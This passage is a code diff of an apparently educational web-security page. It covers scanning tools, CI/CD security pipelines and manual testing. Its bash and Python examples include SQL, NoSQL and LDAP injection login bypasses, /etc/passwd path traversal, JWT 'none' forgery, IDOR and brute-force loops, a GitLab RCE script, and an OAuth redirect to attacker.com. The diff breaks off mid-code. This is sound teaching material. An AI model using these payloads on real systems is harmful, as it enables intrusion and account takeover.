+                      <h6 className="font-semibold text-purple-400 mb-2">Professional DAST Solutions</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>Burp Suite Professional:</strong> Manual + automated testing</li>
+                        <li>• <strong>OWASP ZAP:</strong> Free dynamic security scanner</li>
+                        <li>• <strong>Acunetix:</strong> Automated web vulnerability scanner</li>
+                        <li>• <strong>Rapid7 AppSpider:</strong> Enterprise DAST platform</li>
+                        <li>• <strong>Qualys WAS:</strong> Cloud-based web app scanning</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
+                      <h6 className="font-semibold text-orange-400 mb-2">Specialized DAST Tools</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>Nikto:</strong> Web server vulnerability scanner</li>
+                        <li>• <strong>W3af:</strong> Web application attack framework</li>
+                        <li>• <strong>Arachni:</strong> Ruby-based web scanner</li>
+                        <li>• <strong>Skipfish:</strong> Active web reconnaissance</li>
+                        <li>• <strong>Wapiti:</strong> Web application vulnerability scanner</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              
+              <div className="mt-6">
+                <h5 className="font-semibold mb-3 text-cybr-primary">CI/CD Security Integration</h5>
                 <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                   <div className="p-3 bg-cybr-muted/30 rounded">
-                    <h6 className="font-semibold text-cybr-primary">CI/CD Integration</h6>
-                    <ul className="text-sm mt-2 space-y-1">
-                      <li>• Jenkins plugins</li>
-                      <li>• GitHub Actions</li>
-                      <li>• GitLab CI/CD</li>
-                      <li>• Azure DevOps</li>
+                    <h6 className="font-semibold text-cyan-400 mb-2">Pipeline Integration</h6>
+                    <ul className="text-sm space-y-1">
+                      <li>• Jenkins security plugins</li>
+                      <li>• GitHub Actions security workflows</li>
+                      <li>• GitLab CI/CD security templates</li>
+                      <li>• Azure DevOps security tasks</li>
+                      <li>• AWS CodePipeline integration</li>
                     </ul>
                   </div>
+                  
                   <div className="p-3 bg-cybr-muted/30 rounded">
-                    <h6 className="font-semibold text-cybr-primary">Dependency Scanning</h6>
-                    <ul className="text-sm mt-2 space-y-1">
-                      <li>• npm audit</li>
-                      <li>• Snyk</li>
-                      <li>• WhiteSource</li>
+                    <h6 className="font-semibold text-yellow-400 mb-2">Dependency Scanning</h6>
+                    <ul className="text-sm space-y-1">
+                      <li>• npm audit (Node.js)</li>
+                      <li>• Snyk vulnerability database</li>
                       <li>• OWASP Dependency Check</li>
+                      <li>• WhiteSource security platform</li>
+                      <li>• Sonatype Nexus Lifecycle</li>
                     </ul>
                   </div>
+                  
                   <div className="p-3 bg-cybr-muted/30 rounded">
-                    <h6 className="font-semibold text-cybr-primary">Container Security</h6>
-                    <ul className="text-sm mt-2 space-y-1">
-                      <li>• Trivy</li>
-                      <li>• Clair</li>
-                      <li>• Twistlock</li>
-                      <li>• Aqua Security</li>
+                    <h6 className="font-semibold text-red-400 mb-2">Container Security</h6>
+                    <ul className="text-sm space-y-1">
+                      <li>• Trivy container scanner</li>
+                      <li>• Clair vulnerability scanner</li>
+                      <li>• Anchore container analysis</li>
+                      <li>• Twistlock security platform</li>
+                      <li>• Aqua Security solutions</li>
                     </ul>
                   </div>
                 </div>
               </div>
+
+              <CodeExample
+                language="yaml"
+                title="CI/CD Security Pipeline Configuration"
+                code={`# GitHub Actions Security Workflow
+name: Security Scan Pipeline
+on: [push, pull_request]
+
+jobs:
+  sast-scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      
+      # Static Code Analysis
+      - name: Run Semgrep
+        uses: returntocorp/semgrep-action@v1
+        with:
+          config: >-
+            p/security-audit
+            p/secrets
+            p/owasp-top-ten
+      
+      # Dependency Scanning
+      - name: Run Snyk
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
+        with:
+          args: --severity-threshold=high
+      
+      # Container Scanning
+      - name: Run Trivy
+        uses: aquasecurity/trivy-action@master
+        with:
+          image-ref: 'myapp:latest'
+          format: 'sarif'
+          output: 'trivy-results.sarif'
+
+  dast-scan:
+    runs-on: ubuntu-latest
+    needs: sast-scan
+    steps:
+      - name: ZAP Baseline Scan
+        uses: zaproxy/action-baseline@v0.6.1
+        with:
+          target: 'https://staging.example.com'
+          rules_file_name: '.zap/rules.tsv'
+          cmd_options: '-a'
+
+# Jenkins Pipeline (Jenkinsfile)
+pipeline {
+    agent any
+    
+    stages {
+        stage('SAST Scan') {
+            steps {
+                script {
+                    // SonarQube Analysis
+                    sh 'sonar-scanner -Dsonar.projectKey=myapp'
+                    
+                    // Semgrep Scan
+                    sh 'semgrep --config=auto --json --output=semgrep.json .'
+                    
+                    // Bandit for Python
+                    sh 'bandit -r . -f json -o bandit-report.json'
+                }
+            }
+        }
+        
+        stage('Dependency Check') {
+            steps {
+                dependencyCheck additionalArguments: '', odcInstallation: 'Default'
+                dependencyCheckPublisher pattern: 'dependency-check-report.xml'
+            }
+        }
+        
+        stage('DAST Scan') {
+            steps {
+                script {
+                    // OWASP ZAP Scan
+                    sh '''
+                        docker run -v $(pwd):/zap/wrk/:rw \\
+                        -t owasp/zap2docker-stable \\
+                        zap-full-scan.py -t https://staging.example.com \\
+                        -r zap_report.html
+                    '''
+                }
+            }
+        }
+    }
+    
+    post {
+        always {
+            publishHTML([
+                allowMissing: false,
+                alwaysLinkToLastBuild: true,
+                keepAll: true,
+                reportDir: '.',
+                reportFiles: 'zap_report.html',
+                reportName: 'ZAP Security Report'
+            ])
+        }
+    }
+}
+
+# GitLab CI/CD Security Template
+include:
+  - template: Security/SAST.gitlab-ci.yml
+  - template: Security/Dependency-Scanning.gitlab-ci.yml
+  - template: Security/Container-Scanning.gitlab-ci.yml
+  - template: Security/DAST.gitlab-ci.yml
+
+variables:
+  DAST_WEBSITE: "https://staging.example.com"
+  SAST_EXCLUDED_PATHS: "spec, test, tests, tmp"
+
+stages:
+  - test
+  - security
+  - deploy
+
+custom-sast:
+  stage: security
+  script:
+    - semgrep --config=auto --json --output=gl-sast-report.json .
+  artifacts:
+    reports:
+      sast: gl-sast-report.json
+
+custom-dependency-scan:
+  stage: security
+  script:
+    - safety check --json --output safety-report.json
+    - npm audit --json > npm-audit.json
+  artifacts:
+    reports:
+      dependency_scanning: safety-report.json
+
+# Docker Security Scanning
+docker-security-scan:
+  stage: security
+  script:
+    - docker build -t myapp:$CI_COMMIT_SHA .
+    - trivy image --format template --template "@contrib/gitlab.tpl" -o gl-container-scanning-report.json myapp:$CI_COMMIT_SHA
+  artifacts:
+    reports:
+      container_scanning: gl-container-scanning-report.json`}
+              />
+            </AccordionContent>
+          </AccordionItem>
+
+          <AccordionItem value="specialized-scanning">
+            <AccordionTrigger className="text-lg font-semibold">
+              Specialized Vulnerability Assessment Techniques
+            </AccordionTrigger>
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Cloud Security Scanning</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">AWS Security Tools</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>ScoutSuite:</strong> Multi-cloud security auditing</li>
+                        <li>• <strong>Prowler:</strong> AWS security assessment tool</li>
+                        <li>• <strong>Pacu:</strong> AWS exploitation framework</li>
+                        <li>• <strong>CloudMapper:</strong> AWS environment analysis</li>
+                        <li>• <strong>S3Scanner:</strong> S3 bucket security assessment</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">Azure Security Assessment</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>ROADtools:</strong> Azure AD reconnaissance</li>
+                        <li>• <strong>PowerZure:</strong> Azure exploitation toolkit</li>
+                        <li>• <strong>MicroBurst:</strong> Azure security testing</li>
+                        <li>• <strong>Stormspotter:</strong> Azure Red Team tool</li>
+                        <li>• <strong>AADInternals:</strong> Azure AD manipulation</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+                
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">API Security Testing</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-purple-400 mb-2">REST API Testing</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• HTTP method manipulation (PUT, DELETE, PATCH)</li>
+                        <li>• Parameter pollution attacks</li>
+                        <li>• Content-Type confusion attacks</li>
+                        <li>• Rate limiting bypass techniques</li>
+                        <li>• CORS policy exploitation</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-orange-400 mb-2">GraphQL Security</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Introspection query abuse</li>
+                        <li>• Query complexity attacks (DoS)</li>
+                        <li>• Nested query exploitation</li>
+                        <li>• Batch query attacks</li>
+                        <li>• Authorization bypass techniques</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              
+              <CodeExample
+                language="bash"
+                title="Advanced Specialized Scanning Techniques"
+                code={`# Cloud Security Assessment
+# AWS Security Scanning
+scout aws --profile default --report-dir aws_report/
+prowler -g cislevel2 -M csv,html
+pacu --session mysession --exec enumerate_services_boto3
+
+# S3 Bucket Security Assessment
+aws s3 ls s3://company-backup --recursive
+s3scanner -f bucket_names.txt -o bucket_results.txt
+cloud_enum -k company -t 50
+
+# Azure Security Scanning
+roadrecon auth -u user@company.com -p password
+roadrecon gather --tokens tokens.json
+roadrecon gui --database roadrecon.db
+
+# GCP Security Assessment
+gcp-scanner -p project-id -o gcp_results.json
+gcpbucketbrute -k keywords.txt -t 20
+
+# API Security Testing
+# REST API Enumeration
+ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://api.example.com/v1/FUZZ -mc 200,400,401,403,500
+
+# GraphQL Security Testing
+python3 graphql-playground.py -t https://api.example.com/graphql
+graphql-cop -t https://api.example.com/graphql -o graphql_report.json
+
+# API Rate Limiting Tests
+for i in {1..1000}; do
+  curl -H "Authorization: Bearer token123" https://api.example.com/users &
+  if [ $((i % 50)) -eq 0 ]; then echo "Sent $i requests"; fi
+done
+
+# JWT Security Testing
+jwt_tool.py -t https://api.example.com/admin -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
+python3 jwt_confusion.py -u https://api.example.com/profile -j jwt_token
+
+# Mobile Web Application Testing
+# iOS Safari User-Agent Testing
+curl -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15" https://m.example.com
+
+# Progressive Web App Security
+python3 pwa_security_scanner.py -u https://app.example.com
+service-worker-analyzer https://app.example.com/sw.js
+
+# IoT Device Web Interface Testing
+nmap -p 80,443,8080,8443,9000,9001 --script http-title,http-headers iot_devices.txt
+iot-inspector -t 192.168.1.0/24 -p 80,443,8080
+
+# Container Security Scanning
+trivy image nginx:latest --format json -o trivy_nginx.json
+docker-bench-security.sh
+clair-scanner --ip $(docker-machine ip) nginx:latest
+
+# Kubernetes Security Assessment
+kube-bench --targets=master,node,etcd,policies
+kube-hunter --remote some.k8s-cluster.com
+kubeaudit all -f deployment.yaml
+
+# Serverless Security Testing
+# AWS Lambda Testing
+lambda-guard scan function.zip
+slic-watch deploy --function-name my-function
+
+# Function-as-a-Service (FaaS) Testing
+python3 faas_security_scanner.py -u https://functions.example.com
+
+# CI/CD Pipeline Security
+# Jenkins Security Assessment
+python3 jenkins_attack_framework.py -u https://jenkins.example.com
+jenkins-scanner -u https://jenkins.example.com -w wordlist.txt
+
+# GitLab Security Testing
+gitlab-enum -u https://gitlab.example.com -t token123
+python3 gitlab_rce_cve_2021_22205.py -u https://gitlab.example.com
+
+# Docker Registry Security
+reg info registry.example.com
+docker-registry-scanner -u https://registry.example.com
+
+# SSL/TLS Comprehensive Testing
+testssl.sh --parallel --protocols --server-defaults --headers --vulnerabilities https://example.com
+sslscan --show-certificate --no-colour https://example.com | tee ssl_report.txt
+
+# Certificate Transparency Monitoring
+certstream-python -f "*.example.com" --json | jq -r '.data.leaf_cert.subject.CN'
+
+# Network Service Discovery
+nmap -sV -sC -O -A --script=default,discovery,safe target_network/24
+masscan -p1-65535 --rate=10000 10.0.0.0/8 --exclude 255.255.255.255`}
+              />
             </AccordionContent>
           </AccordionItem>
         </Accordion>
       </div>
 
-      {/* Manual Testing */}
+      {/* Manual Testing Methodologies */}
       <div className="card">
         <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
           <Target className="h-7 w-7 text-cybr-primary" />
-          Manual Testing Methodologies
+          Advanced Manual Testing & Exploitation
         </h3>
         
         <Accordion type="single" collapsible className="space-y-4">
-          <AccordionItem value="session-management">
+          <AccordionItem value="session-security">
             <AccordionTrigger className="text-lg font-semibold">
-              Session Management Testing
+              Session Management & Authentication Security
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 <div>
-                  <h5 className="font-semibold mb-3">Testing Areas</h5>
-                  <ul className="list-disc pl-6 space-y-2">
-                    <li><strong>Session Token Strength:</strong> Entropy analysis, predictability testing</li>
-                    <li><strong>Session Fixation:</strong> Pre-login token persistence</li>
-                    <li><strong>Session Timeout:</strong> Idle and absolute timeout testing</li>
-                    <li><strong>Concurrent Sessions:</strong> Multiple login handling</li>
-                    <li><strong>Cookie Security:</strong> HttpOnly, Secure, SameSite attributes</li>
-                    <li><strong>Session Invalidation:</strong> Logout functionality testing</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Session Security Testing Areas</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">Token Analysis</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>Entropy Testing:</strong> Randomness and predictability analysis</li>
+                        <li>• <strong>Token Scope:</strong> Domain restrictions and path limitations</li>
+                        <li>• <strong>Lifecycle Management:</strong> Creation, renewal, expiration</li>
+                        <li>• <strong>Concurrent Sessions:</strong> Multiple login handling</li>
+                        <li>• <strong>Session Fixation:</strong> Pre-authentication token persistence</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">Cookie Security</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>HttpOnly Attribute:</strong> XSS protection verification</li>
+                        <li>• <strong>Secure Flag:</strong> HTTPS-only transmission</li>
+                        <li>• <strong>SameSite Policy:</strong> CSRF protection mechanism</li>
+                        <li>• <strong>Path & Domain:</strong> Scope restriction testing</li>
+                        <li>• <strong>Expiration:</strong> Lifetime and timeout validation</li>
+                      </ul>
+                    </div>
+                  </div>
                 </div>
+                
                 <div>
-                  <h5 className="font-semibold mb-3">Common Vulnerabilities</h5>
-                  <ul className="list-disc pl-6 space-y-2">
-                    <li><strong>Weak Session IDs:</strong> Sequential or predictable tokens</li>
-                    <li><strong>Session Hijacking:</strong> Token theft via XSS or network</li>
-                    <li><strong>Session Replay:</strong> Token reuse after logout</li>
-                    <li><strong>Privilege Escalation:</strong> Session token manipulation</li>
-                    <li><strong>Cross-Domain Issues:</strong> Subdomain cookie sharing</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Authentication Bypass Techniques</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
+                      <h6 className="font-semibold text-purple-400 mb-2">Injection-Based Bypass</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• SQL injection in login forms</li>
+                        <li>• NoSQL injection (MongoDB, CouchDB)</li>
+                        <li>• LDAP injection for directory services</li>
+                        <li>• XPath injection in XML authentication</li>
+                        <li>• Command injection in custom auth</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
+                      <h6 className="font-semibold text-orange-400 mb-2">Logic-Based Bypass</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• HTTP parameter pollution</li>
+                        <li>• Race condition attacks</li>
+                        <li>• Password reset token manipulation</li>
+                        <li>• Multi-factor authentication bypass</li>
+                        <li>• OAuth implementation flaws</li>
+                      </ul>
+                    </div>
+                  </div>
                 </div>
               </div>
               
               <CodeExample
                 language="bash"
-                title="Session Testing Commands"
-                code={`# Session token entropy analysis
-burp-session-analyzer --url https://example.com/login --samples 1000
+                title="Advanced Session & Authentication Testing"
+                code={`# Session Token Entropy Analysis
+python3 -c "
+import requests
+import collections
+tokens = []
+for i in range(1000):
+    r = requests.post('https://example.com/login', data={'user':'test','pass':'test'})
+    if 'sessionid' in r.cookies:
+        tokens.append(r.cookies['sessionid'])
+print('Unique tokens:', len(set(tokens)))
+print('Token length:', len(tokens[0]) if tokens else 0)
+print('Character distribution:', collections.Counter(''.join(tokens)))
+"
 
-# Cookie security check
-curl -I https://example.com/dashboard | grep -i "set-cookie"
+# Session Fixation Testing
+# Step 1: Get pre-auth session
+curl -c session1.txt https://example.com/login
+# Step 2: Login with fixed session
+curl -b session1.txt -c session2.txt -d "user=admin&pass=password" https://example.com/login
+# Step 3: Check if session ID remains the same
+diff session1.txt session2.txt
 
-# Session timeout testing
-curl -c cookies.txt -b cookies.txt https://example.com/dashboard
-sleep 3600  # Wait for timeout
-curl -b cookies.txt https://example.com/dashboard
+# Concurrent Session Testing
+# Terminal 1
+curl -c admin_session1.txt -d "user=admin&pass=password" https://example.com/login
+curl -b admin_session1.txt https://example.com/admin/dashboard
 
-# Concurrent session testing
-curl -c session1.txt -d "user=admin&pass=password" https://example.com/login
-curl -c session2.txt -d "user=admin&pass=password" https://example.com/login
-curl -b session1.txt https://example.com/dashboard
-curl -b session2.txt https://example.com/dashboard`}
+# Terminal 2
+curl -c admin_session2.txt -d "user=admin&pass=password" https://example.com/login
+curl -b admin_session2.txt https://example.com/admin/dashboard
+
+# Cookie Security Analysis
+curl -I https://example.com/login | grep -i "set-cookie"
+python3 -c "
+import requests
+r = requests.get('https://example.com/dashboard')
+for cookie in r.cookies:
+    print(f'Cookie: {cookie.name}')
+    print(f'Value: {cookie.value}')
+    print(f'Domain: {cookie.domain}')
+    print(f'Path: {cookie.path}')
+    print(f'Secure: {cookie.secure}')
+    print(f'HttpOnly: {cookie.has_nonstandard_attr(\"HttpOnly\")}')
+    print('---')
+"
+
+# Authentication Bypass Attempts
+# SQL Injection in Login
+curl -X POST -d "username=admin'--&password=anything" https://example.com/login
+curl -X POST -d "username=admin' OR '1'='1'--&password=test" https://example.com/login
+
+# NoSQL Injection
+curl -X POST -H "Content-Type: application/json" -d '{"username":{"$ne":null},"password":{"$ne":null}}' https://example.com/api/login
+
+# LDAP Injection
+curl -X POST -d "username=*)(uid=*))(|(uid=*&password=anything" https://example.com/ldap-login
+
+# HTTP Parameter Pollution
+curl -X POST -d "username=user&username=admin&password=test" https://example.com/login
+
+# Password Reset Token Analysis
+python3 -c "
+import requests
+tokens = []
+for i in range(50):
+    r = requests.post('https://example.com/forgot-password', data={'email':'test@example.com'})
+    # Extract token from response or email
+    token = extract_token(r.text)  # Custom function
+    tokens.append(token)
+print('Token patterns:', analyze_patterns(tokens))
+"
+
+# Multi-Factor Authentication Bypass
+# Bypass attempt 1: Skip MFA step
+curl -X POST -d "username=admin&password=password" https://example.com/login
+curl -b cookies.txt https://example.com/dashboard  # Skip MFA
+
+# Bypass attempt 2: Reuse MFA codes
+curl -X POST -d "username=admin&password=password&mfa_code=123456" https://example.com/verify-mfa
+sleep 60
+curl -X POST -d "username=admin&password=password&mfa_code=123456" https://example.com/verify-mfa
+
+# JWT Token Manipulation
+python3 jwt_tool.py -t https://example.com/api/profile -rh "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
+
+# OAuth Flow Testing
+# Authorization code interception
+curl "https://oauth.example.com/authorize?client_id=123&redirect_uri=http://attacker.com&response_type=code&scope=read"
+
+# Session Timeout Testing
+curl -c session.txt -d "user=admin&pass=password" https://example.com/login
+sleep 1800  # Wait 30 minutes
+curl -b session.txt https://example.com/dashboard
+
+# Cross-Domain Session Testing
+curl -c cookies.txt https://app.example.com/login
+curl -b cookies.txt https://api.example.com/data  # Test subdomain sharing
+
+# Session Invalidation Testing
+curl -c session.txt -d "user=admin&pass=password" https://example.com/login
+curl -b session.txt https://example.com/logout
+curl -b session.txt https://example.com/dashboard  # Should fail
+
+# Brute Force Protection Testing
+for i in {1..100}; do
+  curl -X POST -d "username=admin&password=wrong$i" https://example.com/login
+  if [ $((i % 10)) -eq 0 ]; then
+    echo "Attempt $i - checking for lockout"
+    sleep 1
+  fi
+done`}
               />
             </AccordionContent>
           </AccordionItem>
 
-          <AccordionItem value="authentication">
+          <AccordionItem value="authorization-testing">
             <AccordionTrigger className="text-lg font-semibold">
-              Authentication Testing
+              Authorization & Access Control Testing
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                 <div>
-                  <h5 className="font-semibold mb-3">Authentication Mechanisms</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>Username/Password:</strong> Traditional credentials</li>
-                    <li><strong>Multi-Factor Authentication:</strong> SMS, TOTP, Hardware tokens</li>
-                    <li><strong>Biometric Authentication:</strong> Fingerprint, face recognition</li>
-                    <li><strong>Certificate-Based:</strong> Client certificates</li>
-                    <li><strong>OAuth/OpenID Connect:</strong> Federated authentication</li>
-                    <li><strong>SAML:</strong> Enterprise single sign-on</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Access Control Models</h5>
+                  <div className="space-y-2">
+                    <div className="p-2 bg-blue-900/20 border border-blue-500 rounded text-sm">
+                      <strong className="text-blue-400">RBAC:</strong> Role-Based Access Control
+                    </div>
+                    <div className="p-2 bg-green-900/20 border border-green-500 rounded text-sm">
+                      <strong className="text-green-400">ABAC:</strong> Attribute-Based Access Control
+                    </div>
+                    <div className="p-2 bg-yellow-900/20 border border-yellow-500 rounded text-sm">
+                      <strong className="text-yellow-400">DAC:</strong> Discretionary Access Control
+                    </div>
+                    <div className="p-2 bg-purple-900/20 border border-purple-500 rounded text-sm">
+                      <strong className="text-purple-400">MAC:</strong> Mandatory Access Control
+                    </div>
+                  </div>
                 </div>
+                
                 <div>
-                  <h5 className="font-semibold mb-3">Testing Checklist</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>Brute Force Protection:</strong> Rate limiting, account lockout</li>
-                    <li><strong>Password Policy:</strong> Complexity requirements</li>
-                    <li><strong>Credential Enumeration:</strong> Username discovery attacks</li>
-                    <li><strong>Default Credentials:</strong> Admin/admin testing</li>
-                    <li><strong>Password Reset:</strong> Token security, process bypass</li>
-                    <li><strong>Remember Me:</strong> Persistent login security</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Common Authorization Flaws</h5>
+                  <div className="space-y-2">
+                    <div className="p-2 bg-red-900/20 border border-red-500 rounded text-sm">
+                      <strong className="text-red-400">IDOR:</strong> Insecure Direct Object References
+                    </div>
+                    <div className="p-2 bg-orange-900/20 border border-orange-500 rounded text-sm">
+                      <strong className="text-orange-400">Vertical Escalation:</strong> User to admin
+                    </div>
+                    <div className="p-2 bg-pink-900/20 border border-pink-500 rounded text-sm">
+                      <strong className="text-pink-400">Horizontal Escalation:</strong> User A to User B
+                    </div>
+                    <div className="p-2 bg-cyan-900/20 border border-cyan-500 rounded text-sm">
+                      <strong className="text-cyan-400">Function Level:</strong> Missing access controls
+                    </div>
+                  </div>
+                </div>
+                
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Testing Methodologies</h5>
+                  <div className="space-y-2">
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-lime-400">Parameter Manipulation:</strong> ID modification
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-violet-400">Path Traversal:</strong> Directory access
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-rose-400">HTTP Method Testing:</strong> PUT, DELETE
+                    </div>
+                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
+                      <strong className="text-amber-400">Cookie Manipulation:</strong> Role modification
+                    </div>
+                  </div>
                 </div>
               </div>
-            </AccordionContent>
-          </AccordionItem>
+              
+              <CodeExample
+                language="bash"
+                title="Comprehensive Authorization Testing"
+                code={`# IDOR (Insecure Direct Object Reference) Testing
+# Enumerate user IDs
+for id in {1..1000}; do
+  curl -H "Authorization: Bearer user_token" https://example.com/api/users/$id | grep -q "access denied" || echo "Accessible ID: $id"
+done
 
-          <AccordionItem value="authorization">
-            <AccordionTrigger className="text-lg font-semibold">
-              Authorization Testing
-            </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-                <div>
-                  <h5 className="font-semibold mb-3">Access Control Types</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li><strong>RBAC:</strong> Role-Based Access Control</li>
-                    <li><strong>ABAC:</strong> Attribute-Based Access Control</li>
-                    <li><strong>DAC:</strong> Discretionary Access Control</li>
-                    <li><strong>MAC:</strong> Mandatory Access Control</li>
-                  </ul>
-                </div>
-                <div>
-                  <h5 className="font-semibold mb-3">Common Flaws</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li><strong>IDOR:</strong> Direct object references</li>
-                    <li><strong>Privilege Escalation:</strong> Vertical/horizontal</li>
-                    <li><strong>Missing Function Level Access Control</strong></li>
-                    <li><strong>Forced Browsing:</strong> URL manipulation</li>
-                  </ul>
-                </div>
-                <div>
-                  <h5 className="font-semibold mb-3">Testing Methods</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li><strong>Parameter Manipulation:</strong> ID modification</li>
-                    <li><strong>Path Traversal:</strong> Directory access</li>
-                    <li><strong>HTTP Method Testing:</strong> PUT, DELETE</li>
-                    <li><strong>Cookie Manipulation:</strong> Role modification</li>
-                  </ul>
-                </div>
-              </div>
+# Test different object types
+curl -H "Authorization: Bearer user123_token" https://example.com/api/documents/456
+curl -H "Authorization: Bearer user123_token" https://example.com/api/orders/789
+curl -H "Authorization: Bearer user123_token" https://example.com/api/profiles/101
+
+# GUID/UUID IDOR Testing
+python3 -c "
+import requests
+import uuid
+for i in range(100):
+    test_uuid = str(uuid.uuid4())
+    r = requests.get(f'https://example.com/api/files/{test_uuid}', 
+                    headers={'Authorization': 'Bearer token123'})
+    if r.status_code != 404:
+        print(f'Potential IDOR: {test_uuid} - Status: {r.status_code}')
+"
+
+# Vertical Privilege Escalation Testing
+# Test admin functions with regular user token
+curl -H "Authorization: Bearer regular_user_token" https://example.com/admin/users
+curl -H "Authorization: Bearer regular_user_token" https://example.com/admin/settings
+curl -X POST -H "Authorization: Bearer regular_user_token" -d '{"role":"admin"}' https://example.com/api/users/promote
+
+# Role manipulation via parameters
+curl -X POST -d "username=testuser&password=password&role=admin" https://example.com/register
+curl -X PUT -H "Authorization: Bearer token" -d '{"role":"administrator"}' https://example.com/api/profile
+
+# Horizontal Privilege Escalation
+# User A trying to access User B's data
+curl -H "Authorization: Bearer userA_token" https://example.com/api/users/userB/profile
+curl -H "Authorization: Bearer userA_token" https://example.com/api/users/userB/orders
+
+# Function-Level Access Control Testing
+# Test all HTTP methods on sensitive endpoints
+for method in GET POST PUT DELETE PATCH HEAD OPTIONS; do
+  curl -X $method -H "Authorization: Bearer user_token" https://example.com/admin/users
+done
+
+# Path Traversal in Authorization Context
+curl -H "Authorization: Bearer token" https://example.com/files/../../../etc/passwd
+curl -H "Authorization: Bearer token" https://example.com/documents/../../admin/config.xml
+
+# Cookie-Based Role Manipulation
+# Modify role in JWT token
+python3 -c "
+import jwt
+import json
+token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0...'
+decoded = jwt.decode(token, verify=False)
+decoded['role'] = 'admin'
+new_token = jwt.encode(decoded, algorithm='none')
+print(new_token)
+"
+
+# Session-based role escalation
+curl -c cookies.txt -d "user=regularuser&pass=password" https://example.com/login
+# Modify session data
+sed -i 's/role=user/role=admin/' cookies.txt
+curl -b cookies.txt https://example.com/admin/dashboard
+
+# API Key Authorization Testing
+# Test different API keys
+api_keys=("key1" "key2" "admin_key" "test_key")
+for key in "${api_keys[@]}"; do
+  curl -H "X-API-Key: $key" https://example.com/api/sensitive-data
+done
+
+# OAuth Scope Testing
+# Test different OAuth scopes
+scopes=("read" "write" "admin" "delete" "manage")
+for scope in "${scopes[@]}"; do
+  curl -H "Authorization: Bearer oauth_token_$scope" https://example.com/api/admin/users
+done
+
+# Multi-Tenant Access Control Testing
+# Test cross-tenant data access
+curl -H "Authorization: Bearer tenant1_token" https://example.com/api/tenant2/data
+curl -H "X-Tenant-ID: tenant2" -H "Authorization: Bearer tenant1_token" https://example.com/api/data
+
+# Time-based Access Control Testing
+# Test access during restricted hours
+python3 -c "
+import requests
+import time
+# Test access at different times
+for hour in range(24):
+    # Simulate different times (would need actual time manipulation)
+    r = requests.get('https://example.com/time-restricted-resource',
